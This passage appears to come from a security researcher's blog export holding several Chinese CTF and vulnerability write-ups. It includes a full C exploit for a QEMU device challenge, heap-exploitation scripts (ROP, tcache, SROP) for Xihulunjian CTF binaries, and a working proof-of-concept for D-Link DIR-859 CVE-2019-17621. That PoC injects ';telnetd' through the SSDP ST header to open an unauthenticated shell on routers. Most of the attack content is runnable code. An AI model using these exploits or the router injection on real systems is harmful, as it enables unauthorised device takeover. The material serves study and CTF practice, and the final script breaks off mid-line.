addr, uint64_t val, unsigned int size)&#123; uint32_t *v4; // rbp if ( addr == 8 ) &#123; if ( val &lt;= 0x100 ) opaque-&gt;seek = val; &#125; else if ( addr &gt; 8 ) &#123; if ( addr == 28 ) &#123; opaque-&gt;r_seed = val; v4 = opaque-&gt;key; do *v4++ = ((__int64 (__fastcall *)(uint32_t *, __int64, uint64_t, _QWORD))opaque-&gt;rand_r)( &amp;opaque-&gt;r_seed, 28LL, val, *(_QWORD *)&amp;size); while ( v4 != (uint32_t *)&amp;opaque-&gt;rand_r ); &#125; &#125; else if ( addr ) &#123; if ( addr == 4 ) &#123; *(_QWORD *)opaque-&gt;key = 0LL; *(_QWORD *)&amp;opaque-&gt;key[2] = 0LL; &#125; &#125; else &#123; opaque-&gt;memory_mode = val; &#125;&#125; 2.3 利用思路 利用越界读读出rand_r的地址，算出libc地址 利用越界写将system地址写入rand_r的位置 将原来seek的位置以及后面的block写入cat flag命令 利用pmio_write调用rand_r从而实现命令执行 2.4 本地调试解压 1cpio -idmv &lt; rootfs.img 编译写好的exp 1gcc -O0 -o exp -static d3dev.c 将写好的二进制文件编译后打包入rootfs.img中 1find . | cpio -o --format=newc &gt; ../rootfs.img 然后直接运行它的laungh.sh就行了 我在20.04的环境下可以直接运行起来,然后ps -ax查看当前有哪些进程，使用gdb attach对应的进程就可以进行相应的调试了 调试时查看结构体可以在d3dev相关函数断点下 12&gt;p *((d3devState *)$rdi)&gt; 就可以查看了 0x03 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167#include &lt;assert.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/io.h&gt;unsigned char* mmio_mem;uint32_t pmio_base = 0xc040; //cat /sys/devices/pci0000\\:00/0000\\:00\\:03.0/resourceuint32_t keys[4] = &#123;0&#125;;uint64_t libc_base ;void die(const char* msg)&#123; perror(msg); exit(-1);&#125;void mmio_write(uint32_t addr, uint32_t value)&#123; *((uint32_t*)(mmio_mem + addr)) = value;&#125;uint32_t mmio_read(uint32_t addr)&#123; return *((uint32_t*)(mmio_mem + addr));&#125;void pmio_write(uint32_t addr, uint32_t value)&#123; outl(value,addr);&#125;uint32_t pmio_read(uint32_t addr)&#123; return (uint32_t)inl(addr);&#125;uint32_t pmio_arbread(uint32_t offset)&#123; pmio_write(pmio_base+0,offset); return pmio_read(pmio_base+4);&#125;void pmio_abwrite(uint32_t offset, uint32_t value)&#123; pmio_write(pmio_base+0,offset); pmio_write(pmio_base+4,value);&#125;void reset_keys()&#123; uint32_t seed = 0; for(int i = 0;i&lt;4;++i) &#123; keys[i] = rand_r(&amp;seed); printf(\"keys[%d] test = %p\\n\",i, keys[i]); &#125; pmio_write(28 + pmio_base,0); pmio_write(4 + pmio_base,0); return ;&#125;void set_seek_off(uint32_t offset)&#123; pmio_write(8 + pmio_base,offset);&#125;uint64_t decrypt(uint32_t x, uint64_t y)&#123; uint32_t i = 0; do &#123; i -=0x61C88647; x += (i + y) ^ ( ((unsigned int)y &gt;&gt; 5)) ^ ( y &lt;&lt; 4); y = (uint32_t)(((i + x) ^ ((x &gt;&gt; 5)) ^ ( x &lt;&lt; 4)) + y); &#125; while (i != 0xC6EF3720); printf(\"x = %p, y = %p , i = %p\\n\",x,y,i); uint64_t ans = (y &lt;&lt; 32) + x; printf(\"ans = %p\\n\",ans); return ans - 0x4AEB0;&#125;uint64_t encrypt(uint64_t rr)&#123; uint32_t i , x ; uint64_t y; i = 0xC6EF3720; x = rr &amp; 0xffffffff ; y = rr &gt;&gt; 32 ; do &#123; y = (uint32_t)(y - ((x + i) ^ (x &gt;&gt; 5) ^ ( x &lt;&lt; 4 ))); x = x - (((y + i) ^ (y &gt;&gt; 5) ^ ( y &lt;&lt; 4 ) )) ; i = i + 0x61C88647; &#125; while (i); printf(\"x = %p, y = %p , i = %p\\n\",x,y,i); return (y &lt;&lt; 32) + x;&#125;int main(int argc, char *argv[])&#123; uint32_t tmp = 0xdeadbeef; uint32_t tmp1 = 0; uint32_t tmp2 = 0; // Open and map I/O memory for the strng device int mmio_fd = open(\"/sys/devices/pci0000:00/0000:00:03.0/resource0\", O_RDWR | O_SYNC); if (mmio_fd == -1) die(\"mmio_fd open failed\"); mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0); if (mmio_mem == MAP_FAILED) die(\"mmap mmio_mem failed\"); printf(\"mmio_mem @ %p\\n\", mmio_mem); tmp = mmio_read(24); printf(\"tmp test = %p\\n\", tmp); // Open and map I/O memory for the strng device if (iopl(3) !=0 ) die(\"I/O permission is not enough\"); reset_keys(); set_seek_off(0x100); // get rand_r uint64_t yy; uint32_t xx; yy = mmio_read(24); printf(\"tmp1 test = %p\\n\", yy); // part 1 xx = mmio_read(24); printf(\"tmp2 test = %p\\n\", xx); // part 2 high libc_base = decrypt(xx,yy); printf(\"libc_base = %p\\n\",libc_base); uint64_t system = libc_base + 0x0000000000055410; printf(\"system = %p\\n\",system); mmio_write(24, (uint32_t)(encrypt(system))); mmio_write(24, (uint32_t)(encrypt(system) &gt;&gt; 32)); // char sed[4] = \"cat \"; // char flag[8] = \"/home/ct\"; // char flag2[8] = \"f/flag\\x00\"; uint32_t flag1 = 0x20746163; //\"cat \" uint64_t flag2 = 0x67616c66; // \"flag\" // uint64_t flag3 = 0x67616c662f66; set_seek_off(0); mmio_write(0, (uint32_t)(encrypt(flag2))); mmio_write(0, (uint32_t)(encrypt(flag2) &gt;&gt; 32)); // mmio_write(8, (uint32_t)(encrypt(flag3))); // mmio_write(8, (uint32_t)(encrypt(flag3) &gt;&gt; 32)); pmio_write(28 + pmio_base,flag1);&#125; 0x04 远程exp模板来自[这里]([[Pwn 笔记]Linux Kernel 调试文件总结 | binLep’s Blog](https://binlep.github.io/2020/03/12/[Pwn 笔记]Linux Kernel 调试文件总结/)) 123456789101112131415161718192021222324252627#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *import oscontext.log_level = 'debug'cmd = '/ #'def exploit(r): r.sendlineafter(cmd, 'stty -echo') os.system('gcc -static -O0 ./d3dev.c -o ./exp') os.system('gzip -c ./exp &gt; ./exp.gz') r.sendlineafter(cmd, 'cat &lt;&lt;EOF &gt; exp.gz.b64') r.sendline((read('./exp.gz')).encode('base64')) r.sendline('EOF') r.sendlineafter(cmd, 'base64 -d exp.gz.b64 &gt; exp.gz') r.sendlineafter(cmd, 'gunzip ./exp.gz') r.sendlineafter(cmd, 'chmod +x ./exp') r.sendlineafter(cmd, './exp') r.interactive()# p = process('./startvm.sh', shell=True)p = remote('106.14.216.214',50273)exploit(p)","tags":[{"name":"qemu","slug":"qemu","permalink":"wood1314.github.io/tags/qemu/"}]},{"title":"D-Link DIR-859 及其系列上存在的ssdpcgi未认证命令执行漏洞(CVE-2019–17621)","date":"2021-02-05T01:51:07.000Z","path":"year/02/05/cl6ewld8r000jj63f4k19o6y6/","text":"最近打算针对一个类型的漏洞进行仔细的分析，希望能通过这个漏洞的分析总结归纳出具有这个漏洞的设备的特点，利于指导之后的漏洞挖掘。目前的分析思路： 1. 首先分析该漏洞在DIR-859上的形成原因，利用思路。 2. 查看其他受影响的设备漏洞形成原因和利用方式与该DIR-859上有何不同 3. 研究官方补丁，看看官方如何修补该漏洞 4. 研究除了DLINk系列，其他系列的设备处理SSDP的流程是否也存在类似问题 0x01 漏洞概述主要是在ssdpcgi函数中发现了该漏洞，且因为SSDP协议缘故，该漏洞利用无须通过认证漏洞起因主要是因为环境变量没有进行字符过滤 漏洞研究版本 123型号：DIR-859固件版本：1.06b01 Beta01，1.05架构：MIPS 32位 目前搜集到的受影响的Dlink版本 0x02 漏洞分析首先分析一下这个ssdpcgi函数的逻辑首先是a1,也就是参数个数。随后获取了四个环境变量HTTP_ST这个字段主要是关系到搜索的方式，根据函数逻辑一共有4种发现设备的方式 ssdp:all 搜索所有的UPnP设备以及服务 upnp:rootdevice：搜索root设备 uuid: 查询特定uuid的设备 urn: 查询指定类型的设备 以下是四种情况的处理流程，可以看到最终都会执行lxmldbc_system这个函数来执行M-SEARCH.sh这个脚本来查询设备最后执行的命令基本格式就是两种，xxxx就是可以注入的位置 12/etc/scripts/upnp/M-SEARCH.sh ssdpall adddr:port id &amp;/etc/scripts/upnp/M-SEARCH.sh uuid adddr:port id uuid:xxxxxx&amp; 所以只要将ST字段设置为uuid或者urn就可以在最后拼接自己构造的ST还有就是其他人的poc都是说只能用urn：构造后利用。但我觉得uuid也是可以的。现在我先把路由器模拟起来试一下，使用firmadyne进行模拟尝试如此构造header注入，成功 123456[+] Preparando Header ...M-SEARCH * HTTP/1.1HOST:192.168.0.1:1900ST:urn::device:1;telnetdMX:2MAN:&quot;ssdp:discover&quot; 果然uuid也可以，header的ST部分也可以如此构造 1header += &quot;ST:uuid:1;telnetd\\n&quot; 测试使用的反向连接poc脚本12345678910111213141516171819202122232425262728293031323334#!/usr/bin/pythonimport sysimport osimport socketfrom time import sleep# Exploit By Miguel Mendez - @s1kr10sdef config_payload(ip, port): header = \"M-SEARCH * HTTP/1.1\\n\" header += \"HOST:\"+str(ip)+\":\"+str(port)+\"\\n\" header += \"ST:urn::device:1;telnetd\\n\" # header += \"ST:uuid:1;telnetd\\n\" header += \"MX:2\\n\" header += 'MAN:\"ssdp:discover\"'+\"\\n\\n\" return headerdef send_conexion(ip, port, payload): sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP) sock.setsockopt(socket.IPPROTO_IP,socket.IP_MULTICAST_TTL,2) sock.sendto(payload,(ip, port)) sock.close()if __name__== \"__main__\": ip = raw_input(\"Router IP: \") port = 1900 headers = config_payload(ip, port) print(\"\\n---= HEADER =---\\n\") print(\"[+] Preparando Header ...\") print headers print(\"[+] Enviando payload ...\") print(\"[+] Activando servicio telnetd :)\") send_conexion(ip, port, headers) print(\"[+] Conectando al servicio ...n\") sleep(5) os.system('telnet ' + str(ip)) 0x03 针对DIR859上漏洞的总结经过分析我觉得造成这个UPnp漏洞的原因主要有以下两点 环境变量并未进行字符过滤 利用SSDP进行查询时，发现根设备和遍历设备两种模式都不需要额外参数，因此不会造成命令执行注入。但是针对于特定类型设备的查询时比如利用uuid和urn来指定时，指定的信息会成为system命令执行参数的一部分，而这部分就可以造成命令执行注入了。而且包括REMOTE_ADDR和REMOTE_PORT是都没有对其进行过滤，因此这两个是也可以注入的 0x04 其他DLink路由器上的ssdpcgi行为分析1 DIR885LDIR885LA (1.20b02) 是已经经过了修补的 首先一样的是获取四个环境变量的操作，但是sub_17788对ST进行了一些操作 让我们跟进sub_17788看看其做了什么操作，发现 1234567891011121314151617181920212223242526272829303132333435363738394041424344int __fastcall sub_17788(const char *a1)&#123; v14 = 0; memset(v13, 0, sizeof(v13)); //首先看首部是不是uuid result = strncmp(a1, \"uuid:\", 5u); //如果不是uuid，那么就应该是urn来指定设备 if ( result ) &#123; while ( 1 ) &#123; //每次循环将urn指定的设备格式和它硬编码在程序里的一个字典循环比较，如果字典比较完了还没有匹配就直接置0退出 if ( !off_30354[v14] ) &#123; dword_30350 = 0; return result; &#125; result = strcmp(off_30354[v14], a1); if ( !result ) break; ++v14; &#125; //如果匹配到了相应字典就把该设备名称输入到变量里 result = snprintf(byte_3051C, 0x400u, \"%s\", off_30354[v14]); &#125; //如果是uuid就利用格式化字符串转化成uuid的格式 else &#123; snprintf(v13, 0x400u, \"%s\", a1 + 5); v2 = strtok(v13, \"-\"); v3 = strtol(v2, 0, 16); v4 = strtok(0, \"-\"); v5 = strtol(v4, 0, 16); v6 = strtok(0, \"-\"); v7 = strtol(v6, 0, 16); v8 = strtok(0, \"-\"); v9 = strtol(v8, 0, 16); v10 = strtok(0, \"-\"); v11 = strtoll(v10, 0, 16); result = snprintf(byte_3051C, 0x400u, \"uuid:%08X-%04X-%04X-%04X-%012llX\", v3, v5, v7, v9, v11); &#125; return result;&#125; 2 DIR-865L版本1.07b01漏洞与DIR-859基本没有区别，漏洞点与漏洞代码完全一致 0x05 其他厂商路由器对SSDP的实现1 ASUS WRT-AC66U利用下面这个命令找到usr/sbin/miniupnpd，这个二进制文件应该是提供SSDP服务的看名称感觉华硕使用的是开源的miniupnp模块 1grep -rnl &quot;upnp&quot; 接着逆向分析固件，搜索ssdp相关函数（也可以搜索ST字符串）找到对应的逻辑 同样关注点在选择特定参数或者uuid的查询上，核心逻辑就是下面这个图 可以看到他每次查询都是从一个已经查询好的列表里不停匹配（rootDevice)，匹配成功了就返回成功的结果，不存在用户输入被执行了的结果 2 FAST-FER 450与AC66U一样，同样使用miniupnpd，代码基本一致 3 网剑R6700自己实现的一个过程，完整过程还需研究 参考CVE-2019–17621: D-Link DIR-859 未授权命令执行漏洞分析 - 安全客，安全资讯平台 (anquanke.com)","tags":[{"name":"IOT","slug":"IOT","permalink":"wood1314.github.io/tags/IOT/"}]},{"title":"SSDP协议","date":"2021-02-05T01:21:28.000Z","path":"year/02/05/cl6ewld9j001ej63fglzx94e6/","text":"SSDP协议0x01何为SSDPSSDP 使用一个固定的组播地址 239.255.255.250 和 UDP 端口号 1900 来监听其他设备的请求。SSDP 协议的请求消息有两种类型，第一种是服务通知，设备和服务使用此类通知消息声明自己存在；第二种是查询请求，协议客户端用此请求查询某种类型的设备和服务。 “为了能被网络搜索发现，目标设备应该向发起多播请求的源IP地址及端口发送单播UDP响应。如果M-SEARCH请求报文的ST头部字段以“ssdp:all”、“upnp:rootdevice”或者“uuid:”开头，后面跟着与设备相匹配的UUID信息，或者如果M-SERCH请求与设备支持的设备类型或服务类型相匹配，那么该设备就会应答M-SEARCH请求报文”。这种策略在实际环境中能够正常工作。例如，我的Chrome浏览器经常会请求搜索智能电视： 1234567$ sudo tcpdump -ni eth0 udp and port 1900 -A IP 192.168.1.124.53044 &gt; 239.255.255.250.1900: UDP, length 175 M-SEARCH * HTTP/1.1 HOST: 239.255.255.250:1900 MAN: &quot;ssdp:discover&quot; MX: 1 ST: urn:dial-multiscreen-org:service:dial:1 USER-AGENT: Google Chrome/58.0.3029.110 Windows 这个报文被发往一个多播IP地址。监听这一地址的其他设备如果与报文头部中指定的ST（search-target，搜索目标）多屏幕类型设备相匹配，那么这些设备应该会响应这个请求报文。除了请求具体的设备类型，请求报文中还可以包含两类“通用的”ST查询类型：1、upnp:rootdevice：搜索root设备2、ssdp:all：搜索所有的UPnP设备以及服务你可以运行以下python脚本（在另一脚本的基础上修改而得），使用前面提到的这些ST查询类型来枚举网络中的设备列表： 1234567891011121314151617181920212223#!/usr/bin/env python2 import socket import sys dst = \"239.255.255.250\" if len(sys.argv) &gt; 1: dst = sys.argv[1] st = \"upnp:rootdevice\" if len(sys.argv) &gt; 2: st = sys.argv[2] msg = [ 'M-SEARCH * HTTP/1.1', 'Host:239.255.255.250:1900', 'ST:%s' % (st,), 'Man:\"ssdp:discover\"', 'MX:1', ''] s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) s.settimeout(10) s.sendto('rn'.join(msg), (dst, 1900) ) while True: try: data, addr = s.recvfrom(32*1024) except socket.timeout: break print \"[+] %sn%s\" % (addr, data) 0x02设备查询当一个客户端接入网络的时候，它可以向一个特定的多播地址的 SSDP 端口使用 M-SEARCH 方法发送 “ssdp:discover” 消息。当设备监听到这个保留的多播地址上由控制点发送的消息的时候，设备将通过单播的方式直接响应控制点的请求。 典型的设备查询请求消息格式： 12345M-SEARCH * HTTP/1.1S:uuid:ijklmnop-7dec-11d0-a765-00a0c91e6bf6Host:239.255.255.250:1900Man:&quot;ssdp:discover&quot;ST:ge:fridgeMX:3 响应消息响应消息应该包含服务的位置信息（Location 或AL头），ST和USN头。响应消息应该包含cache控制信息（max-age 或者 Expires头）。 典型的响应消息格式： 12345HTTP/1.1 200 OKCache-Control: max-age= seconds until advertisement expiresS: uuid:ijklmnop-7dec-11d0-a765-00a0c91e6bf6Location: URL for UPnP description for root deviceCache-Control: no-cache=&quot;Ext&quot;,max-age=5000ST:ge:fridge // search targetUSN: uuid:abcdefgh-7dec-11d0-a765-00a0c91e6bf6 设备通知消息在设备加入网络时，它应当向一个特定的多播地址的 SSDP 端口使用 NOTIFY 方法发送 “ssdp:alive” 消息，以便宣布自己的存在，更新期限信息，更新位置信息。 1 ssdp:alive 消息由于 UDP 协议是不可信的，设备应该定期发送它的公告消息。在设备加入网络时，它必须用 NOTIFY 方法发送一个多播传送请求。NOTIFY 方法发送的请求没有回应消息。 典型的设备通知消息格式如下： 1234567NOTIFY * HTTP/1.1HOST: 239.255.255.250:1900CACHE-CONTROL: max-age = seconds until advertisement expiresLOCATION: URL for UPnP description for root deviceNT: search targetNTS: ssdp:aliveUSN: advertisement UUID 2 ssdp:byebye消息当一个设备计划从网络上卸载的时候，它也应当向一个特定的多播地址的 SSDP 端口使用 NOTIFY 方法发送 “ssdp:byebye” 消息。但是，即使没有发送 “ssdp:byebye” 消息，控制点也会根据 “ssdp:alive” 消息指定的超时值，将超时并且没有再次收到的 “ssdp:alive” 消息对应的设备认为是失效的设备。 典型的设备卸载消息格式如下： 1234NOTIFY * HTTP/1.1HOST: 239.255.255.250:1900NT: search targetNTS: ssdp:byebyeUSN: advertisement UUID 参考P2P 网络核心技术：UPnP 和 SSDP 协议 - 知乎 (zhihu.com)","tags":[{"name":"IOT","slug":"IOT","permalink":"wood1314.github.io/tags/IOT/"},{"name":"SSDP","slug":"SSDP","permalink":"wood1314.github.io/tags/SSDP/"}]},{"title":"v8-startctf2019-oob","date":"2020-11-12T06:24:00.000Z","path":"year/11/12/cl6ewldau004cj63fwxz43m5i/","text":"一道简单v8例题来看下v8的利用 0x01 题目准备先恢复到指定版本 1git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598 编译 123gclient syncgit apply &lt; ../browser_pwn/Chrome/oob.difftools/dev/v8gen.py x64.release 修改文件 1vim out.gn/x64.release/args.gn 添加内容 1234v8_enable_backtrace = truev8_enable_disassembler = truev8_enable_object_print = truev8_enable_verify_heap = true 最后编译 1ninja -C out.gn/x64.release d8","tags":[{"name":"v8","slug":"v8","permalink":"wood1314.github.io/tags/v8/"}]},{"title":"v8 学习基础","date":"2020-11-12T03:21:54.000Z","path":"year/11/12/cl6ewldax004kj63f7u041abg/","text":"主要是v8对象基础的概念。 0x01 v8是什么简而言之，v8就是js的解释器。 V8由很多子模块构成，其中，有几个最重要的模块： Parser：负责将JavaScript源码转换为Abstract Syntax Tree (AST) Ignition：interpreter，即解释器，负责将AST转换为Bytecode，解释执行Bytecode；同时收集TurboFan优化编译所需的信息，比如函数参数的类型 TurboFan：compiler，即编译器，利用Ignitio所收集的类型信息，将Bytecode转换为优化的汇编代码 Orinoco：garbage collector，垃圾回收模块，负责将程序不再需要的内存空间回收 Parser、Ignition、Turbofan协作将JS源码最终编译成汇编代码 0x02 v8 中JS对象结构在下面的代码中定义了a,b两个对象，下面在调试中观察下里面的数据和结构。 1234567891011121314function Foo1 () &#123;&#125;var a = new Foo1();var b = new Foo1();a.name = 'name-a';a.text = 'aaa';b.name = 'name-b';b.text = 'bbb';a[1] = \"a-1\";a[2] = \"a-2\";%DebugPrint(a); //d8中用来打印object内存信息%DebugPrint(b); //d8中用来打印object内存信息%SystemBreak(); //d8中用来中断，调试 2.1 使用谷歌浏览器观察首先先在谷歌开发工具中键入上面的代码，然后在Memory中拍摄快照 我们大致可以看出来，对于a它有两个属性，分别是name和text，这两个属性直接保存在对象结构中。还有两个字符串”a-1”和”a-2”,他们作为元素，保存在了elements中。 因此暂时可以猜测，对象中保存的数据有两种形式： 一种是不需要索引的，称为属性, 另一种是需要索引的，称为元素 2.2 在ubuntu中编译v8观察让我们单独看a打印出来的结构 123456789101112131415161718192021222324252627282930DebugPrint: 0x1c6808148b91: [JS_OBJECT_TYPE] - map: 0x1c68083074fd &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties] - prototype: 0x1c6808148b0d &lt;Object map = 0x1c68083074ad&gt; - elements: 0x1c6808148c81 &lt;FixedArray[19]&gt; [HOLEY_ELEMENTS] - properties: 0x1c6808042229 &lt;FixedArray[0]&gt; - All own properties (excluding elements): &#123; 0x1c68080447d5: [String] in ReadOnlySpace: #name: 0x1c68082d2591 &lt;String[6]: #name-a&gt; (const data field 0), location: in-object //name属性 0x1c68082d25a5: [String] in OldSpace: #text: 0x1c68082d25b5 &lt;String[3]: #aaa&gt; (const data field 1), location: in-object //text属性 &#125; - elements: 0x1c6808148c81 &lt;FixedArray[19]&gt; &#123; 0: 0x1c6808042429 &lt;the_hole&gt; //element中的元素 1: 0x1c68082d25e9 &lt;String[3]: #a-1&gt; 2: 0x1c68082d25f9 &lt;String[3]: #a-2&gt; 3-18: 0x1c6808042429 &lt;the_hole&gt; &#125;0x1c68083074fd: [Map] - type: JS_OBJECT_TYPE //实例类型 - instance size: 52 //实例大小 - inobject properties: 10 //对象内属性存储空间（包含未使用的slots） - elements kind: HOLEY_ELEMENTS - unused property fields: 8 //未使用的属性slot数 - enum length: invalid - stable_map //对象当前处于快速模式（dictionary_map：字典模式） - back pointer: 0x1c68083074d5 &lt;Map(HOLEY_ELEMENTS)&gt; - prototype_validity cell: 0x1c68082d2939 &lt;Cell value= 0&gt; - instance descriptors (own) #2: 0x1c6808148c59 &lt;DescriptorArray[2]&gt; - prototype: 0x1c6808148b0d &lt;Object map = 0x1c68083074ad&gt; - constructor: 0x1c68082d2835 &lt;JSFunction Foo1 (sfi = 0x1c68082d26ad)&gt; - dependent code: 0x1c68080421b5 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt; - construction counter: 5 在v8中打印出的结构更确认了我们上面的猜测，并且更多看到了一些东西。比如map。 还有一些其它的 prototype prototypeelements 对象元素length 元素个数properties 属性 结构图如下: 1234567891011121314151617181920 elements ----&gt; +------------------------+ | MAP +&lt;---------+ +------------------------+ | | element 1 | | +------------------------+ | | element 2 | | | ...... | | | element n | |ArrayObject ----&gt;-------------------------+ | | map | | +------------------------+ | | prototype | | +------------------------+ | | elements | | | +----------+ +------------------------+ | length | +------------------------+ | properties | +------------------------+ 0x03 v8环境搭建3.1代理配置首先在本地的小飞机中，选项设置-》本地代理设置-》开启本地代理-》选择端口 配置git代理,后面的ip采用自己宿主机的，端口采用上一步设置的端口，虚拟机配置采用nat模式 1git config --global http.proxy http://192.168.235.1:1080 配置环境变量,进行全局代理 12export http_proxy=\"http://192.168.235.1:1080\"export https_proxy=$http_proxy 下载工具,并设置环境变量（注意此处环境变量的路径与你下载的路径是否相同 123456git clone https://chromium.googlesource.com/chromium/tools/depot_tools.gitecho 'export PATH=$PATH:\"$HOME/depot_tools\"' &gt;&gt; ~/.bashrcgit clone https://github.com/ninja-build/ninja.gitcd ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; cd ..echo 'export PATH=$PATH:\"$HOME/ninja\"' &gt;&gt; ~/.bashrc 编译v8. 1fetch v8 &amp;&amp; cd v8 123456789gclient sync#更新git reset --hard [commit hash with vulnerability]#切换版本tools/dev/v8gen.py x64.debugninja -C out.gn/x64.debug [d8]#d8参数表示只编译d8#debug-&gt;release编译release版本 启动 1234567./out.gn/x64.release/d8#启动d8交互shell./out.gn/x64.release/d8 test.js#运行test.js./out.gn/x64.debug/d8./out.gn/x64.debug/shell./out.gn/x64.debug/d8 test.js 调试工具,这个gdbinit如果没有的话需要从网上自行下载 12echo 'source /home/w4rd3n/v8/tools/gdbinit' &gt;&gt; ~/.gdbinitecho 'source /home/w4rd3n/v8/tools/gdb-v8-support.py' &gt;&gt; ~/.gdbinit","tags":[{"name":"v8","slug":"v8","permalink":"wood1314.github.io/tags/v8/"}]},{"title":"西湖论剑","date":"2020-10-14T15:44:31.000Z","path":"year/10/14/cl6ewldbo006aj63ft2shljyk/","text":"1，3题很简单。5题当时已经想到要打printf的返回地址，但是当时调试崩掉了就没出。2题和4题没看，都是server还蛮有意思。 mmutag在栈上构造fake_chunk，然后用rop 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687from pwn import *from LibcSearcher import LibcSearchercontext.log_level = 'DEBUG'# sh = process('./mmutag')sh = remote('183.129.189.62',58004)def add(idx,content): sh.sendline('1') sh.recvuntil('id:') sh.sendline(str(idx)) sh.recvuntil('content') sh.send(content) sh.recvuntil('choise:\\n')def delete(idx): sh.sendline('2') sh.recvuntil('id:') sh.sendline(str(idx)) sh.recvuntil('choise:\\n')puts_plt = 0x4006B0puts_got = 0x602020libc_start_main = 0x602048rdi_ret = 0x0000000000400d23rsi_r15_ret = 0x0000000000400d21start_addr = 0x400750sh.recvuntil('name:')sh.sendline('aaaa')sh.recvuntil('tag: ')stack_addr = int(sh.recvuntil(':',drop=True),16)log.info('stack = ' + hex(stack_addr))sh.sendline('2')sh.recvuntil('choise:')sh.sendline('3')payload = 'a' * 0x18 + 'z'sh.send(payload)sh.recvuntil('Your content: ')sh.recvuntil('z')canary = u64(sh.recv(7).rjust(8,'\\x00'))log.info('canary = ' + hex(canary))payload = 'a' * 0x10 + p64(0x71) + p64(canary)sh.sendline('3')sh.send(payload)add(1,'aaa')add(2,'bbb')delete(1)delete(2)delete(1)# gdb.attach(sh)add(3,p64(stack_addr - 0x38))add(4,'a')add(5,'a')payload = p64(canary) + p64(0) + p64(rdi_ret) + p64(libc_start_main) + p64(puts_plt) + p64(start_addr)add(6,payload)delete(1) # for start# sh.recvuntil('choise:\\n')sh.sendline('4')puts_addr = u64(sh.recv(6).ljust(8,'\\x00'))log.info(\"puts_addr = \" + hex(puts_addr))# libc = LibcSearcher('__libc_start_main',puts_addr)libc_base = puts_addr - 0x20750# bin_sh = libc_base + libc.dump('str_bin_sh')system = libc_base + 0x453a0bin_sh = libc_base + 0x18CE17# system = libc_base + libc.dump('system')log.success('libc_base = ' + hex(libc_base))sh.recvuntil('name:')sh.sendline('aaaa')sh.recvuntil('tag: ')stack_addr = int(sh.recvuntil(':',drop=True),16)log.info('stack = ' + hex(stack_addr))sh.sendline('2')payload = 'a' * 0x10 + p64(0x71) + p64(canary)sh.sendline('3')sh.send(payload)delete(1)delete(2)delete(1)add(7,p64(stack_addr - 0x38))add(8,'a')add(9,'a')payload = p64(canary) + p64(0) + p64(rdi_ret) + p64(bin_sh) + p64(system)add(10,payload)# gdb.attach(sh)sh.sendline('4')sh.interactive() http_server模拟了post传参。思路就是tcache打IO_FILE然后leak libc，最后打free_hook写setcontext+53出发SROP，然后调用rop链进行orw 复现的时候碰到了点小问题，就是把stdout的writebase覆盖掉在回显的时候会崩。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103from pwn import* context.arch = 'AMD64'context.log_level = 'debug'context.terminal = ['tmux', 'splitw', '-h']def new(content): p.sendline(\"POST /create Cookie: user=admin token: \\x34\\r\\n\\r\\ncontent=\" + content) sleep(0.05)def free(idx): p.sendline(\"POST /del Cookie: user=admin token: \\x34\\r\\n\\r\\nindex=\" + str(idx)) sleep(0.05)def edit(idx, content): p.sendline(\"POST /edit Cookie: user=admin token: \\x34\\r\\n\\r\\nindex=\" +str(idx) + \"&amp;content=\"+ content) sleep(0.05)while True: p = process('./ezhttp') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') try: new(\"a\"*0x80) p.recvuntil(\"Your gift: \") heap_base = int(p.recvuntil('\"&#125;',drop=True),16) - 0x260 log.success('HEAP:\\t' + hex(heap_base)) new(\"a\"*0x20+'\\x00') new(\"a\"*0x10+'\\x00') new(\"A\"*0x100) for i in range(8): free(0) free(2) free(2) free(2) new(p64(heap_base+0x260)) new(p64(heap_base+0x260)) new('\\x60\\x07\\xdd') free(1) free(1) new(\"a\"*0x20) edit(7,p64(heap_base + 0x260)) new(\"A\"*0x20) new(\"A\"*0x20) #new('a'*0x28) new(p64(0x01010101fbad1801)+\"\\x01\"*0x18+\"\\xc8\") #edit(10,p64(0xFBAD1800) + p64(0)*3 + '\\xC8') # pause() libc_base = u64(p.recvuntil('\\x7F',timeout=0.3)[-6:].ljust(8,'\\x00')) - libc.sym['_IO_2_1_stdin_'] log.success('libc: ' + hex(libc_base)) free_hook = libc_base + libc.sym['__free_hook'] system = libc_base + libc.sym['system'] setcontext = libc_base + libc.sym['setcontext'] + 53 rce = libc_base + 0x4f322 free(2) free(2) new(p64(free_hook)) new(\"UUUU\") new(p64(setcontext)) ret = libc_base + 0x00000000000008aa Open = libc_base + libc.symbols[\"open\"] Read = libc_base + libc.symbols[\"read\"] Puts = libc_base + libc.symbols['puts'] pop_rdi_ret = libc_base +0x000000000002155f pop_rsi_ret = libc_base + 0x0000000000023e6a pop_rdx_ret = libc_base + 0x0000000000001b96 orw = '' orw += p64(pop_rdi_ret)+p64(heap_base + 0x3B8) orw += p64(pop_rsi_ret)+p64(0) orw += p64(Open) orw += p64(pop_rdi_ret) + p64(4) orw += p64(pop_rdx_ret) + p64(0x30) orw += p64(pop_rsi_ret) + p64(heap_base) orw += p64(Read) orw += p64(pop_rdi_ret)+p64(heap_base) orw += p64(Puts) orw += './flag\\x00' frame = SigreturnFrame() frame.rax = 0 frame.rdi = 0 frame.rsi = 0 frame.rdx = 0 frame.rsp = heap_base + 0x250 + 0x90 + 0x30 + 0x20 + 0x10 frame.rip = ret payload = orw + str(frame)[len(orw):] # 